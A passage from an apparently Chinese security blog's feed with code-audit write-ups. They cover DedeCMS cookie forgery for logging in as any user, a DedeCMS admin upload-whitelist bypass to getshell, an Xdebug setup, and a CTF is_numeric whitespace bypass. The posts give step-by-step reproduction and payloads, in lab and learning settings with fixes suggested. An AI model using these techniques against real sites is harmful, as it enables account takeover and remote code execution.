href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&mid=2247484372&idx=1&sn=ffcc51a88c9acf96c312421b75fc2a26&chksm=ec1e33fcdb69baea53838fd545a236c0deb8a42f3b341ee0879c9e4ac9427c2147fab95b6669#rd" target="_blank" rel="noopener">SQL注入学习总结</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Dedecms | cookie伪造导致任意前台用户登录</title>
    <link href="/2019/03/08/Dedecms-cookie%E4%BC%AA%E9%80%A0%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%89%8D%E5%8F%B0%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/"/>
    <url>/2019/03/08/Dedecms-cookie%E4%BC%AA%E9%80%A0%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%89%8D%E5%8F%B0%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p>继续深入了解dedecms漏洞，正好看到freebuf出台了最新漏洞,cookie伪造导致任意前台用户登录就认真的审计了一番。</p></blockquote><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><blockquote><p>windows10专业版<br>php 5.6.27<br>mysql,apache</p></blockquote><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><p>访问网站<code>http://127.0.0.1/Dedecms/uploads/member/index.php?uid=0001</code>,程序执行<code>member/index.php</code>文件122行下<code>else</code>语句。</p><p>当满足第139行 <code>if($vtime - $last_vtime &gt; 3600 || !preg_match(&#39;#,&#39;.$uid.&#39;,#i&#39;, &#39;,&#39;.$last_vid.&#39;,&#39;) )</code> 且不满足 <code>$last_vid!=&#39;&#39;</code> 执行第161行<code>$last_id=$uid</code>。</p><p>执行 <code>PutCookie</code> 语句将 <code>cookie</code> 发送到客户端</p><p><img src="./1.png" srcset="/img/loading.gif" alt=""></p><p>在文件<code>include/common.inc.php</code>，发现109-117对外部传入的变量和值进行声明，从这里可以看出uid值是可控的。(通过GET)，进而可知<code>cookie</code>中的<code>$last_vid</code>是可控的</p><p><img src="./2.png" srcset="/img/loading.gif" alt=""></p><p>跟进<code>PutCookie</code>方法，关注第二个<code>setcookie</code>方法。将<code>$cfg_cookie_encode和$value（$last_vid）</code>进行<code>mad5</code>运算截取前十六位。<code>$cfg_cookie_encode</code>保存在服务端/<code>uploads/data/config.cache.inc.php</code>中为固定值。</p><p><img src="./3.png" srcset="/img/loading.gif" alt=""></p><p>在文件<code>uploads/include/helpers/cookie.helper.php</code>下找到验证用户登录是否合法的关键方法<code>GetCookie</code>,<br>第65行中<code>if($_COOKIE[$key.&#39;__ckMd5&#39;]!=substr(md5($cfg_cookie_encode.$_COOKIE[$key]),0,16))</code> 发现与<code>PutCookie</code>生成cookie值方法相同。</p><p>想要通过伪造cookie得能够通过任意文件或者下载漏洞得到<code>/uploads/data/config.cache.inc.php</code>中得到<code>$cfg_cookie_encod</code>值。还有另一种方法就是通过用户第一次登录使用<code>PutCookie</code>方法生成的cookie值，这样cookie值就能够通过<code>GetCookie</code>效验。</p><p><img src="./4.png" srcset="/img/loading.gif" alt=""></p><p>在<code>uploads/include/memberlogin.class.php</code>发现对账号密码的效验成功之后进入PutLoginInfo方法。</p><p><img src="./5.png" srcset="/img/loading.gif" alt=""></p><p>跟进<code>PutLoginInfo</code>,在登录时所用生成<code>cookie</code>的规则与<code>PutCookie</code>相同</p><p><img src="./6.png" srcset="/img/loading.gif" alt=""></p><p>现在跟入登录检测代码块，在文件<code>/uploads/include/memberlogin.class.php</code>中，<br>第161行找到关键类<code>Memebrlogin</code> ,查看析构函数，发现<code>DedeUserID</code>通过对<code>GetCookie</code>方法进行<code>cookie</code>效验(与<code>PutCookie</code>生成规则相同)。在第185行中，传入数据库查询获取结果显示在界面上。</p><p><img src="./7.png" srcset="/img/loading.gif" alt=""></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="情况一"><a href="#情况一" class="headerlink" title="情况一"></a>情况一</h2><p>1.通过该类可知传入数据库查询的mid值是通过<code>DedeUserID</code>进行查看，且mid在数据中为整型。所以注册用户名0001使得与admin的mid匹配达到越权目的</p><p><img src="./8.png" srcset="/img/loading.gif" alt=""></p><p>2.清理本机浏览器缓存访问网站<a href="http://127.0.0.1/Dedecms/uploads/member/index.php?uid=0001" target="_blank" rel="noopener">http://127.0.0.1/Dedecms/uploads/member/index.php?uid=0001</a>, 通过可控变量uid使得<code>PutCookie</code>下发<code>cookie</code>到客户端<br>生成last_vid  last_vid_ckMd5</p><p><img src="./9.png" srcset="/img/loading.gif" alt=""></p><p>3.访问<a href="http://127.0.0.1/Dedecms/uploads/member/index.php" target="_blank" rel="noopener">http://127.0.0.1/Dedecms/uploads/member/index.php</a> 登录用户，获得服务端下发的cookie。</p><p><img src="./10.png" srcset="/img/loading.gif" alt=""></p><p>4.将<code>last_vid</code>赋值给<code>DedeUserID=0001</code>,<code>lastA_vid_ckMd5</code>赋值给<code>DedeUserID_ckMd5=d7d5f9c170f653ed</code>。刷新界面成功越权</p><p><img src="./11.png" srcset="/img/loading.gif" alt=""></p><h2 id="情况二"><a href="#情况二" class="headerlink" title="情况二"></a>情况二</h2><p>跟入<code>index.php</code>, <code>uid</code>不为空时的查询语句，发现在<code>uploads/member/inc/config_space.php</code>， 中存在sql语句使用<code>like</code>查询，所以我可以构造用户名为<code>xxx1xxx</code>，也能达到越权。</p><p><img src="./12.png" srcset="/img/loading.gif" alt=""></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>代码审计| DEDECMS -V5.7-UTF8-SP2-20180109漏洞集合：<a href="https://www.freebuf.com/column/161703.html" target="_blank" rel="noopener">https://www.freebuf.com/column/161703.html</a></p><h1 id="漏洞成因分析"><a href="#漏洞成因分析" class="headerlink" title="漏洞成因分析"></a>漏洞成因分析</h1><ol><li>使用初始访问uid服务端下放cookie值与用户登录生成cookie进行赋值，验证cookie方法相同。</li><li>页面返回的用户信息通过DedeUserID进行赋值到索引mid中查询，语句为在文件/uploads/include/memberlogin.class.php中找到<pre><code class="hljs xl">$<span class="hljs-function"><span class="hljs-title">this</span>-&gt;</span>M_ID = $<span class="hljs-function"><span class="hljs-title">this</span>-&gt;</span>GetNum(GetCookie(<span class="hljs-string">"DedeUserID"</span>));$<span class="hljs-function"><span class="hljs-title">this</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">fields</span> = $dsql-&gt;</span>G<span class="hljs-function"><span class="hljs-title">etOne</span>("Select * From `#@__member` <span class="hljs-keyword">where</span> mid='&#123;$this-&gt;</span>M_ID&#125;<span class="hljs-string">' ");</span></code></pre></li></ol><p>所以只要成功验证通过cookie值，将查询admin索引条件mid赋值即可越权</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>复现时候要有总体思路，刚开始没思路会有很乱。<br>首先我觉得先用debug跑一圈分析登录程序运行情况。既然成功越权是因为cookie验证漏洞和mid索引，那么就要分析<br>a.cookie生成规则和验证规则在各种情况下的出入，<br>b.sql查询mid值是怎样被赋值。分析页面成功回显admin界面php,sql执行情况</p><p>小tips:使用mid进行查询可以防止sql约束攻击<br>参考链接<a href="https://www.freebuf.com/articles/web/124537.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/124537.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>代码审计 | DedeCMS后台getshell(白名单)</title>
    <link href="/2019/03/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-DedeCMS%E5%90%8E%E5%8F%B0getshell/"/>
    <url>/2019/03/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-DedeCMS%E5%90%8E%E5%8F%B0getshell/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p>为了表示第一次对审计的尊重，前前后后尝试了许多环境才进行代码审计，deepin,docker…..都没有如愿。折腾了两天只能选择windows10下phpstudy来构造审计环境。</p></blockquote><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><blockquote><p>windows10专业版<br>php 5.6.27<br>mysql,apache</p></blockquote><h1 id="getshell演示"><a href="#getshell演示" class="headerlink" title="getshell演示"></a>getshell演示</h1><blockquote><p>构造<code>1.jpg.php</code>－&gt;压缩为<code>1.jpg.zip</code> 内容为<code>&lt;?php phpinfo(); ?&gt;</code></p></blockquote><p>将压缩文件<code>1.jpg.zip</code>上传到<code>soft</code>目录下<br><img src="./1.png" srcset="/img/loading.gif" alt=""><br><img src="./2.png" srcset="/img/loading.gif" alt=""></p><p>访问<code>dede/album_add.php</code><br>选中从zip压缩包中解压图片，浏览<code>1.jpg.zip</code><br><img src="./3.png" srcset="/img/loading.gif" alt=""></p><p>发布图片，点击预览<br><img src="./4.png" srcset="/img/loading.gif" alt=""></p><p>点击<code>shell123she</code>，进入<code>phpinfo</code>,<code>getshell</code>成功<br><img src="./5.png" srcset="/img/loading.gif" alt=""></p><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><p><code>$dopost=save</code> 执行<code>else if</code>语句<br><img src="./6.png" srcset="/img/loading.gif" alt=""></p><p>进入<code>if($formzip==1)</code>执行压缩包解压，在<code>GetMtchFIles</code>设下断点，查看文件名<code>bypass</code>过程<br><img src="./7.png" srcset="/img/loading.gif" alt=""></p><p>跟进GetMatchFIles方法，简要分析<br><img src="./8.png" srcset="/img/loading.gif" alt=""></p><p><code>if($filename == &quot;.&quot; || $filename == &quot;..&quot;)</code>跳过对两个隐藏文件  <code>&#39;.&#39;</code>  <code>&#39;..&#39;</code>的读取.</p><p><img src="./9.png" srcset="/img/loading.gif" alt=""></p><p><code>else if(is_dir($truefile))</code>　对文本路径在做判断<br><img src="./10.png" srcset="/img/loading.gif" alt=""></p><p>满足正确的文件路径,程序进入 <code>else if(preg_match(&quot;/\.(&quot;.$fileexp.&quot;)/i&quot;,$filename))</code><br>执行<code>reg_match</code>,成功绕过白名单，文件被赋值为绝对路径，跳出方法，开始进行保存操作。<br><img src="./11.png" srcset="/img/loading.gif" alt=""></p><p>从下图可以看出<code>1.jpg.php</code>成功绕过正则表达式,但是.php并未做处理<br><img src="./12.png" srcset="/img/loading.gif" alt=""></p><h1 id="代码修复"><a href="#代码修复" class="headerlink" title="代码修复"></a>代码修复</h1><p>１．　将白名单之外的  <code>.后缀名</code>  进行消毒处理</p><p>２．　提取文件合法后缀名进行文件重写。</p><p>（个人理解，实操的话……）<br>打uploads靶场对文件上传的理解<a href="https://zhzhdoai.github.io/2019/01/02/uploadlabs-%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/">uploads_labs</a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>xdebug使用不熟练，总是需要多次重复getshell,debug操作还需要更深入的了解。</li><li>对关键方法需要设置断点，并跟进进行详读和分析。</li><li>白名单拥有比黑名单更好的防御机制，但是需要更好的完善消毒代码</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Xdebug+phpstorm本地调试(LAMP)</title>
    <link href="/2019/03/05/Xdebug-phpstorm%E6%9C%AC%E5%9C%B0%E8%B0%83%E8%AF%95-LAMP/"/>
    <url>/2019/03/05/Xdebug-phpstorm%E6%9C%AC%E5%9C%B0%E8%B0%83%E8%AF%95-LAMP/</url>
    
    <content type="html"><![CDATA[<h1 id="原理导图"><a href="#原理导图" class="headerlink" title="原理导图"></a>原理导图</h1><p><img src="./1.png" srcset="/img/loading.gif" alt=""></p><h1 id="配置xdebug"><a href="#配置xdebug" class="headerlink" title="配置xdebug"></a>配置xdebug</h1><p>1.　 <code>sudo apt-get install php5-xdebug</code>  //可以直接安装，安装之后会在phpinfo界面看到,选好php版本<br><img src="./2.png" srcset="/img/loading.gif" alt=""></p><p>2.　配置<code>/etc/php5/mods-available/xdebug.ini</code> 复制一下信息</p><pre><code class="hljs ini"><span class="hljs-section">[XDebug]</span><span class="hljs-attr">zend_extension</span>=xdebug.so<span class="hljs-comment">; Debug Config</span><span class="hljs-attr">xdebug.remote_enable</span> = <span class="hljs-number">1</span><span class="hljs-attr">xdebug.remote_handler</span> = <span class="hljs-string">"dbgp"</span><span class="hljs-attr">xdebug.remote_host</span> = <span class="hljs-string">"127.0.0.1"</span><span class="hljs-attr">xdebug.remote_port</span> = <span class="hljs-number">9000</span><span class="hljs-attr">xdebug.remote_log</span> = <span class="hljs-string">"/var/log/php-fpm/xdebug.log"</span><span class="hljs-attr">xdebug.remote_autostart</span> = <span class="hljs-number">1</span><span class="hljs-comment">; Profiler Config</span><span class="hljs-attr">xdebug.profiler_enable</span> = <span class="hljs-number">1</span><span class="hljs-attr">xdebug.profiler_enable_trigger</span> = <span class="hljs-number">1</span><span class="hljs-attr">xdebug.profiler_output_dir</span> = <span class="hljs-string">"/tmp/xdebug"</span><span class="hljs-attr">xdebug.profiler_output_name</span> = <span class="hljs-string">"out.%t-%s"</span></code></pre><p>ps:<code>zend_extension=xdebug.so</code>　否则phpstorm在调试时会报错</p><ol start="3"><li>重启apache2服务器 <code>sudo service apache2 restart</code></li></ol><h1 id="配置phpstorm"><a href="#配置phpstorm" class="headerlink" title="配置phpstorm"></a>配置phpstorm</h1><ol><li>配置php编译环境<br><img src="./10.png" srcset="/img/loading.gif" alt=""></li></ol><ol start="2"><li>配置debug端口与<code>xdebug.ini</code>中设置的相同<br><img src="./3.png" srcset="/img/loading.gif" alt=""></li></ol><ol start="3"><li>配置文件访问本地apache2服务器所在端口和ip(默认填写是apache2默认端口和servername)<br>//可以在<code>apache2.ini</code>中查看默认都是<code>http://127.0.0.1/test.php</code>执行文件<br><img src="./4.png" srcset="/img/loading.gif" alt=""></li></ol><ol start="4"><li>在谷歌应用商店中下载Xdebug helper<br>配置选项设置IDE 为phpstorm<br><img src="./5.png" srcset="/img/loading.gif" alt=""></li></ol><h1 id="本地xdebug使用流程"><a href="#本地xdebug使用流程" class="headerlink" title="本地xdebug使用流程"></a>本地xdebug使用流程</h1><ol><li>导入需要调试本地服务项目<code>/var/www/html/php_bugs</code></li></ol><ol start="2"><li>设置本地服务器访问目录<br>在<code>Run-web server debug validation</code><br>按如图所示设置<code>//php_bugs</code>是你项目为文件夹看看自己情况设置<br>点击<code>validate</code>验证是否成功没有报错即可<br><img src="./6.png" srcset="/img/loading.gif" alt=""></li></ol><ol start="3"><li>打开<code>phpstorm</code>右上角的小耳朵<br><img src="./7.png" srcset="/img/loading.gif" alt=""></li></ol><ol start="4"><li>打开浏览器中的xdebug helper。并在该页访问你所导入项目的文件<br><code>http://127.0.0.1/php_bugs/2.php?numebr=%00191</code><br><img src="./8.png" srcset="/img/loading.gif" alt=""></li></ol><ol start="5"><li>在phpstorm中按f7逐步调试，其他按钮都可以试一试<br><img src="./9.png" srcset="/img/loading.gif" alt=""></li></ol><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>断点操作官方教程:<a href="https://www.jetbrains.com/help/phpstorm/debugging-code.html" target="_blank" rel="noopener">https://www.jetbrains.com/help/phpstorm/debugging-code.html</a><br>配置过程：<a href="https://juejin.im/entry/59cba7066fb9a00a4d53f6d3参考连接" target="_blank" rel="noopener">https://juejin.im/entry/59cba7066fb9a00a4d53f6d3参考连接</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>环境搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>函数特性 | 绕过的空白字符</title>
    <link href="/2019/02/27/%E5%87%BD%E6%95%B0%E7%89%B9%E6%80%A7-%E7%BB%95%E8%BF%87%E7%9A%84%E7%A9%BA%E7%99%BD%E5%AD%97%E7%AC%A6/"/>
    <url>/2019/02/27/%E5%87%BD%E6%95%B0%E7%89%B9%E6%80%A7-%E7%BB%95%E8%BF%87%E7%9A%84%E7%A9%BA%E7%99%BD%E5%AD%97%E7%AC%A6/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在整理php弱类型，发现函数缺陷在弱类型中还是挺有意思的，遂找了is_numeric函数来试试手。挺有收货的，不断补全自己的知识盲区。</p><h1 id="使用的空格符替换"><a href="#使用的空格符替换" class="headerlink" title="使用的空格符替换"></a>使用的空格符替换</h1><p>控制码<br>“\0” “%00” (ASCII  0 (0x00))，空字节符。</p><p>制表符<br>“\t” (ASCII  9 (0x09))，水平制表符。</p><p>空白字符：<br>“\n” (ASCII 10 (0x0A))，换行符。<br>“\v” “\x0b” (ASCII  11 (0x0B))，垂直制表符。<br>“\f” “%0c” 换页符<br>“\r” “%0d”(ASCII  13 (0x0D))，回车符。</p><p>空格:<br>“ “ “%20” (ASCII  32 (0x20))，普通空格符。</p><h1 id="源码查找方法"><a href="#源码查找方法" class="headerlink" title="源码查找方法"></a>源码查找方法</h1><p>现在ext找到方法在文件中的定义名，然后在Zend文件中查找</p><pre><code class="hljs elm"><span class="hljs-title">php</span><span class="hljs-number">-5.6</span><span class="hljs-number">.30</span>/ext/standard/string.c$ sudo grep -rn <span class="hljs-string">"PHP_FUNCTION(is_numeric)"</span>-&gt;standard/<span class="hljs-keyword">type</span>.c:314:<span class="hljs-type">PHP_FUNCTION</span>(is_numeric)-&gt;standard/php_<span class="hljs-keyword">type</span>.h:35:<span class="hljs-type">PHP_FUNCTION</span>(is_numeric);<span class="hljs-title">php</span><span class="hljs-number">-5.6</span><span class="hljs-number">.30</span>/<span class="hljs-type">Zend</span>/zend_operators.c$ sudo grep -rn <span class="hljs-string">"is_numeric_string"</span></code></pre><h1 id="Is-numeric源码分析"><a href="#Is-numeric源码分析" class="headerlink" title="Is_numeric源码分析"></a>Is_numeric源码分析</h1><p>Is_numeric只是判别是否为数，而不是修改数。这是大前提，通过源码我们可以得知。</p><pre><code class="hljs processing"><span class="hljs-keyword">static</span> inline zend_uchar is_numeric_string_ex(<span class="hljs-keyword">const</span> <span class="hljs-built_in">char</span> *<span class="hljs-built_in">str</span>, <span class="hljs-built_in">int</span> length, <span class="hljs-keyword">long</span> *lval, <span class="hljs-keyword">double</span> *dval, <span class="hljs-built_in">int</span> allow_errors, <span class="hljs-built_in">int</span> *oflow_info)&#123;<span class="hljs-keyword">const</span> <span class="hljs-built_in">char</span> *ptr;<span class="hljs-built_in">int</span> base = <span class="hljs-number">10</span>, digits = <span class="hljs-number">0</span>, dp_or_e = <span class="hljs-number">0</span>;<span class="hljs-keyword">double</span> local_dval = <span class="hljs-number">0.0</span>;zend_uchar type;<span class="hljs-keyword">if</span> (!length) &#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<span class="hljs-keyword">if</span> (oflow_info != NULL) &#123;*oflow_info = <span class="hljs-number">0</span>;&#125;<span class="hljs-comment">/* Skip any whitespace</span><span class="hljs-comment"> * This is much faster than the isspace() function */</span><span class="hljs-keyword">while</span> (*<span class="hljs-built_in">str</span> == <span class="hljs-string">' '</span> || *<span class="hljs-built_in">str</span> == <span class="hljs-string">'\t'</span> || *<span class="hljs-built_in">str</span> == <span class="hljs-string">'\n'</span> || *<span class="hljs-built_in">str</span> == <span class="hljs-string">'\r'</span> || *<span class="hljs-built_in">str</span> == <span class="hljs-string">'\v'</span> || *<span class="hljs-built_in">str</span> == <span class="hljs-string">'\f'</span>) &#123;<span class="hljs-built_in">str</span>++;length--;&#125;ptr = <span class="hljs-built_in">str</span>;<span class="hljs-comment">//判断正负</span><span class="hljs-keyword">if</span> (*ptr == <span class="hljs-string">'-'</span> || *ptr == <span class="hljs-string">'+'</span>) &#123;ptr++;&#125;<span class="hljs-keyword">if</span> (ZEND_IS_DIGIT(*ptr)) &#123;<span class="hljs-comment">/* Handle hex numbers</span><span class="hljs-comment"> * str is used instead of ptr to disallow signs and keep old behavior */</span><span class="hljs-comment">//判断十六进制</span><span class="hljs-keyword">if</span> (length &gt; <span class="hljs-number">2</span> &amp;&amp; *<span class="hljs-built_in">str</span> == <span class="hljs-string">'0'</span> &amp;&amp; (<span class="hljs-built_in">str</span>[<span class="hljs-number">1</span>] == <span class="hljs-string">'x'</span> || <span class="hljs-built_in">str</span>[<span class="hljs-number">1</span>] == <span class="hljs-string">'X'</span>)) &#123;base = <span class="hljs-number">16</span>;ptr += <span class="hljs-number">2</span>;&#125;<span class="hljs-comment">/* Skip any leading 0s */</span><span class="hljs-keyword">while</span> (*ptr == <span class="hljs-string">'0'</span>) &#123;ptr++;&#125;<span class="hljs-comment">/* Count the number of digits. If a decimal point/exponent is found,</span><span class="hljs-comment"> * it's a double. Otherwise, if there's a dval or no need to check for</span><span class="hljs-comment"> * a full match, stop when there are too many digits for a long */</span><span class="hljs-keyword">for</span> (type = IS_LONG; !(digits &gt;= MAX_LENGTH_OF_LONG &amp;&amp; (dval || allow_errors == <span class="hljs-number">1</span>)); digits++, ptr++) &#123;check_digits:<span class="hljs-keyword">if</span> (ZEND_IS_DIGIT(*ptr) || (base == <span class="hljs-number">16</span> &amp;&amp; ZEND_IS_XDIGIT(*ptr))) &#123;...............</code></pre><p>分析源代码：</p><p>Is_numerci()代码执行流程</p><ol><li>处理空格字符串</li><li>判断传参正负</li><li>十六进制识别</li><li>识别小数和科学计数法</li></ol><h1 id="is-numeric-while缺陷利用"><a href="#is-numeric-while缺陷利用" class="headerlink" title="is_numeric while缺陷利用"></a>is_numeric while缺陷利用</h1><p><strong><em>利用在ctf中展示</em></strong></p><p>##　空格字符处理<br><img src="./1.png" srcset="/img/loading.gif" alt=""><br>Is_numeric() 在执行前会跳过所有空格字符，保留原来空格字符长度增大。这样处理对数值判断是没有影响。</p><h2 id="验证Demo："><a href="#验证Demo：" class="headerlink" title="验证Demo："></a>验证Demo：</h2><?php if(($_GET['num'])>='0' &&  ($_GET['num']) <= '9'){    echo "True";}else{    echo "False";}?><p><br><img src="./2.png" srcset="/img/loading.gif" alt=""></p><h2 id="数值判断方法"><a href="#数值判断方法" class="headerlink" title="数值判断方法"></a>数值判断方法</h2><p><code>#define ZEND_IS_DIGIT(c) ((c) &gt;= &#39;0&#39; &amp;&amp; (c) &lt;= &#39;9&#39;)</code><br><strong><em>如果没有绕过while对字符串的处理那么函数is_numeric返回为FALSE</em></strong></p><h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php"> </span><span class="php">$info = <span class="hljs-string">""</span>; </span><span class="php">$req = [];</span><span class="php">$flag=<span class="hljs-string">"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"</span>;</span><span class="php"> </span><span class="php">ini_set(<span class="hljs-string">"display_error"</span>, <span class="hljs-keyword">false</span>); <span class="hljs-comment">//为一个配置选项设置值</span></span><span class="php">error_reporting(<span class="hljs-number">0</span>); <span class="hljs-comment">//关闭所有PHP错误报告</span></span><span class="php"> </span><span class="php"><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'number'</span>]))&#123;</span><span class="php">   header(<span class="hljs-string">"hint:26966dc52e85af40f59b4fe73d8c323a.txt"</span>); <span class="hljs-comment">//HTTP头显示hint 26966dc52e85af40f59b4fe73d8c323a.txt</span></span><span class="php"> </span><span class="php">   <span class="hljs-keyword">die</span>(<span class="hljs-string">"have a fun!!"</span>); <span class="hljs-comment">//die — 等同于 exit()</span></span><span class="php"> </span><span class="php">&#125;</span><span class="php"> </span><span class="php"><span class="hljs-keyword">foreach</span>([$_GET, $_POST] <span class="hljs-keyword">as</span> $global_var) &#123;  <span class="hljs-comment">//foreach 语法结构提供了遍历数组的简单方式 </span></span><span class="php">    <span class="hljs-keyword">foreach</span>($global_var <span class="hljs-keyword">as</span> $key =&gt; $value) &#123; </span><span class="php">        $value = trim($value);  <span class="hljs-comment">//trim — 去除字符串首尾处的空格字符（或者其他字符）</span></span><span class="php">        is_string($value) &amp;&amp; $req[$key] = addslashes($value); <span class="hljs-comment">// is_string — 检测变量是否是字符串，addslashes — 使用反斜线引用字符串</span></span><span class="php">    &#125; <span class="hljs-comment">//存入数组req中ｖａｌｕｅ</span></span><span class="php">&#125; </span><span class="php"> </span><span class="php"> </span><span class="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_palindrome_number</span><span class="hljs-params">($number)</span> </span>&#123; </span><span class="php">    $number = strval($number); <span class="hljs-comment">//strval — 获取变量的字符串值</span></span><span class="php">    $i = <span class="hljs-number">0</span>; </span><span class="php">    $j = strlen($number) - <span class="hljs-number">1</span>; <span class="hljs-comment">//strlen — 获取字符串长度</span></span><span class="php">    <span class="hljs-keyword">while</span>($i &lt; $j) &#123; </span><span class="php">        <span class="hljs-keyword">if</span>($number[$i] !== $number[$j]) &#123; </span><span class="php">            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>; </span><span class="php">        &#125; </span><span class="php">        $i++; </span><span class="php">        $j--; </span><span class="php">    &#125; </span><span class="php">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>; </span><span class="php">&#125; </span><span class="php"> </span><span class="php"> </span><span class="php"><span class="hljs-keyword">if</span>(is_numeric($_REQUEST[<span class="hljs-string">'number'</span>])) <span class="hljs-comment">//is_numeric — 检测变量是否为数字或数字字符串 </span></span><span class="php">&#123;</span><span class="php"> </span><span class="php">   $info=<span class="hljs-string">"sorry, you cann't input a number!"</span>;</span><span class="php"> </span><span class="php">&#125;</span><span class="php"><span class="hljs-keyword">elseif</span>($req[<span class="hljs-string">'number'</span>]!=strval(intval($req[<span class="hljs-string">'number'</span>]))) <span class="hljs-comment">//intval — 获取变量的整数值．这里要做的是使得elseif False。空白字符绕过</span></span><span class="php">&#123;</span><span class="php"> </span><span class="php">     $info = <span class="hljs-string">"number must be equal to it's integer!! "</span>; </span><span class="php"> </span><span class="php">&#125;</span><span class="php"><span class="hljs-keyword">else</span></span><span class="php">&#123;</span><span class="php"> </span><span class="php">     $value1 = intval($req[<span class="hljs-string">"number"</span>]);</span><span class="php">     $value2 = intval(strrev($req[<span class="hljs-string">"number"</span>]));<span class="hljs-comment">//strrev 反转字符串  </span></span><span class="php"> </span><span class="php">     <span class="hljs-keyword">if</span>($value1!=$value2)&#123;</span><span class="php">          $info=<span class="hljs-string">"no, this is not a palindrome number!"</span>;</span><span class="php">          </span><span class="php">     &#125;</span><span class="php">     <span class="hljs-keyword">else</span></span><span class="php">     &#123;</span><span class="php"> </span><span class="php">          <span class="hljs-keyword">if</span>(is_palindrome_number($req[<span class="hljs-string">"number"</span>]))&#123;</span><span class="php">              $info = <span class="hljs-string">"nice! &#123;$value1&#125; is a palindrome number!"</span>; </span><span class="php">          &#125;</span><span class="php">          <span class="hljs-keyword">else</span></span><span class="php">          &#123;</span><span class="php">             $info=$flag;</span><span class="php">          &#125;</span><span class="php">     &#125;</span><span class="php"> </span><span class="php">&#125;</span><span class="php"> </span><span class="php"><span class="hljs-keyword">echo</span> $info;</span></code></pre><h2 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h2><ol><li>循环遍历数组foreach去除字符串首尾空格，转义字符串。</li><li>方法 is_palindrome_number()判断是否为回文数。</li><li>之后的代码才是重点通过矛盾的if/else语句得到flag<br><img src="./3.png" srcset="/img/loading.gif" alt=""><br>我们的目标是得到<code>$info=$flag</code>最后一个else语句<br><img src="./4.png" srcset="/img/loading.gif" alt=""><br>我首先想到是科学计数法(我也不知为什么)，但发现不可以，看完之前对is_numeric源码分析，发现判断无关整数的类型。</li></ol><p><strong><em>题目要求回文整数</em></strong></p><h3 id="1-传入number-191"><a href="#1-传入number-191" class="headerlink" title="1. 传入number=191"></a>1. 传入<code>number=191</code></h3><blockquote><blockquote><p><code>sorry, you cann&#39;t input a number!</code></p></blockquote></blockquote><h3 id="2-分析is-numeric"><a href="#2-分析is-numeric" class="headerlink" title="2. 分析is_numeric"></a>2. 分析is_numeric</h3><p>使得while为False必须绕过<code>’ ’,’\t’,‘\r’,’\v’,’f’</code></p><p>而条件<code>$req[&#39;number&#39;]!=strval(intval($req[&#39;number&#39;]</code>因为弱类型会忽略空白格符号自动转换为整形比较数值<br>通过fuzz可得，可传入参数%00191</p><blockquote><blockquote><p><code>nice! 191 is a palindrome number!</code><br><strong><em>//不需要考虑$value1!=$value2影响，因为他们被intval修饰！！！</em></strong></p></blockquote></blockquote><h3 id="3-但是我们需要的是-info-flag-需要绕过is-palindrome-number-req-“number”"><a href="#3-但是我们需要的是-info-flag-需要绕过is-palindrome-number-req-“number”" class="headerlink" title="3. 但是我们需要的是$info=$flag;需要绕过is_palindrome_number($req[“number”]"></a>3. 但是我们需要的是$info=$flag;需要绕过is_palindrome_number($req[“number”]</h3><p>根据trim源代码分析少去掉的空格符号有<code>\n \r \t \v \0</code><br>发现少了个<code>\f</code> url编码为<code>%0c</code><br><img src="./5.png" srcset="/img/loading.gif" alt=""></p><h3 id="4-传入参数-number-00-0c191"><a href="#4-传入参数-number-00-0c191" class="headerlink" title="4. 传入参数?number=%00%0c191"></a>4. 传入参数?number=%00%0c191</h3><blockquote><blockquote><p>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx<br>成功得到flag</p></blockquote></blockquote><h1 id="参考链接"><a href="#参考链接" class="headerlink" 